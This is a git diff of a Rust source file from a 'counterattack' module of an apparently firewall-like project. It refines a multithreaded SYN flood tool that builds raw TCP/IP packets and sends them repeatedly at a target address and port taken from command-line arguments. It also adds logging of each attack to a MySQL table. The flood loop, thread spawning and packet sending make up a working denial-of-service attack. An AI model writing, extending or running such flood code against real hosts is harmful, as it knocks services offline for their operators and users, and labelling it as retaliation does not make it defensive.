@@ -1,12 +1,13 @@
 //! @Author       : 白银
 //! @Date         : 2023-01-19 19:33:57
 //! @LastEditors  : 白银
-//! @LastEditTime : 2023-02-16 19:01:20
+//! @LastEditTime : 2023-02-17 19:35:57
 //! @FilePath     : /rwaf/src/module/counterattack/syn_flood.rs
 //! @Description  :
 //! @Attention    :
 //! @Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved.
 
+use mysql::{params, prelude::Queryable, Pool};
 use pnet::packet::{
     ip::*,
     ipv4::{checksum, Ipv4Flags, MutableIpv4Packet},
@@ -14,7 +15,7 @@ use pnet::packet::{
 };
 use pnet_transport::{transport_channel, TransportChannelType::Layer3};
 use rand::{random, thread_rng, Rng};
-use std::{io::stdin, net::Ipv4Addr, process::Command, thread, env};
+use std::{env, fs::File, io::Read, net::Ipv4Addr, process::Command, thread};
 const IPV4_HEADER_LEN: usize = 20;
 const TCP_HEADER_LEN: usize = 32;
 const DATA_HEADER_LEN: usize = 1024;
@@ -31,8 +32,8 @@ pub fn start_syn() {
     // println!("for example -> 127.0.0.1:1234");
     let args: Vec<String> = env::args().collect();
     let arg_ipv4_addr_port = &args.clone()[2];
-    let mut ipv4_addr_port = arg_ipv4_addr_port.to_string();
-    stdin().read_line(&mut ipv4_addr_port).expect("err");
+    let ipv4_addr_port = arg_ipv4_addr_port.to_string();
+    // stdin().read_line(&mut ipv4_addr_port).expect("err");
     let ipv4_addr: &str = get_ipv4_addr(&ipv4_addr_port);
     let ipv4_port: &str = get_ipv4_port(&ipv4_addr_port);
 
@@ -44,27 +45,39 @@ pub fn start_syn() {
     // println!("{}", ipv4_addr);
     // println!("{}", ipv4_port);
 
-    println!("input thread_num:");
-    let mut thread_num = String::new();
-    stdin().read_line(&mut thread_num).expect("err");
+    // println!("input thread_num:");
+    let args: Vec<String> = env::args().collect();
+    let arg_thread_num = &args.clone()[3];
+    let thread_num = arg_thread_num.to_string();
+    // stdin().read_line(&mut thread_num).expect("err");
+
+    let sqlurl = &get_only_sqlurl().to_string()[..];
 
     let binding = get_date_time();
     let date_time: Vec<&str> = binding.split("\n").collect();
     let now_date = date_time.clone()[0]; //get system date
     let now_time = date_time.clone()[1]; //get system time
     let do_what = "counterattack";
-    let mut counterattack_ip = &target.to_string();
+    let counterattack_ip = &target.to_string();
     let event_id: String = now_date.to_string() + now_time + do_what + counterattack_ip;
     let input_event_id = super::super::use_sm3::sm3_main(event_id);
 
-    write_to_respond_log_sql();
+    write_to_respond_log_sql(
+        sqlurl,
+        input_event_id,
+        now_date,
+        now_time,
+        do_what,
+        counterattack_ip,
+    )
+    .unwrap();
 
     for _ in 0..thread_num.trim().parse().unwrap() {
         let t = thread::spawn(move || {
             attack(data_count, target, target_port)
             // attack(data_count, get_ipv4_addr(&ipv4_addr_port), get_ipv4_port(&ipv4_addr_port))
         });
-        // t.join();
+        t.join().unwrap();
     }
 
     // for _ in 0..thread_num.trim().parse().unwrap() {
@@ -125,7 +138,7 @@ fn build_packet(target: String, port: u32, packet: &mut [u8]) -> TcpPacket {
 
     let ipv4_dst: Ipv4Addr = target.parse().unwrap();
     {
-        let packet_len = packet.len();
+        // let packet_len = packet.len();
         let mut ip_header = MutableIpv4Packet::new(&mut packet[..]).unwrap();
 
         ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
@@ -186,7 +199,7 @@ fn attack(data_count: i32, target: Ipv4Addr, ipv4_port: i32) {
             &mut packet[..],
         );
         // 发送数据包到目标地址
-        tx.send_to(packet, std::net::IpAddr::V4(target));
+        tx.send_to(packet, std::net::IpAddr::V4(target)).unwrap();
     }
 }
 
@@ -198,6 +211,75 @@ fn get_date_time() -> String {
     res
 }
 
-fn write_to_respond_log_sql() {
-    todo!()
+fn get_only_sqlurl() -> String {
+    let mut open_config = File::open("src/config").unwrap();
+    let mut config_content = String::new();
+    open_config.read_to_string(&mut config_content).unwrap();
+
+    let binding = config_content;
+    let res1: Vec<&str> = binding.split("\n").collect(); //get line
+    let binding2 = res1.clone()[12]; //get line
+    let binding3 = binding2.to_string();
+    let res2: Vec<&str> = binding3.split("→").collect(); //get left
+    let binding4 = res2.clone()[0]; //get left
+    let binding5 = binding4.to_string();
+    let real_res_tmp = get_needed_thing(&binding5); //get sqlurl
+
+    real_res_tmp.to_string()
+}
+
+fn get_needed_thing(s: &String) -> &str {
+    let len = s.trim().chars().count();
+    let bytes = s.as_bytes();
+
+    for (i, &item) in bytes.iter().enumerate() {
+        if item == b'=' {
+            return &s[i + 1..len];
+        }
+    }
+
+    // s.len()
+    &s[..]
+}
+
+struct Payment {
+    event_id: String,
+    date: String,
+    time: String,
+    event: String,
+    counterattack_ip: String,
+}
+
+fn write_to_respond_log_sql(
+    sqlurl: &str,
+    input_event_id: String,
+    now_date: &str,
+    now_time: &str,
+    do_what: &str,
+    counterattack_ip: &String,
+) -> std::result::Result<(), Box<dyn std::error::Error>> {
+    let url = sqlurl;
+
+    let pool = Pool::new(url)?;
+    let mut conn = pool.get_conn()?;
+    let payments = vec![Payment {
+        event_id: input_event_id,
+        date: now_date.to_string(),
+        time: now_time.to_string(),
+        event: do_what.to_string(),
+        counterattack_ip: counterattack_ip.to_string(),
+    }];
+
+    conn.exec_batch(
+        r"INSERT INTO respond_log (event_id, date, time, event, counterattack_ip) VALUES (:event_id, :date, :time, :event, :counterattack_ip)",
+        payments.iter().map(|p| params! {
+            "event_id" => p.event_id.clone(),
+            "date" => p.date.clone(),
+            "time" => &p.time,
+            "event" => &p.event,
+            "counterattack_ip" => &p.counterattack_ip,
+        })
+    )?;
+
+    Ok(())
 }
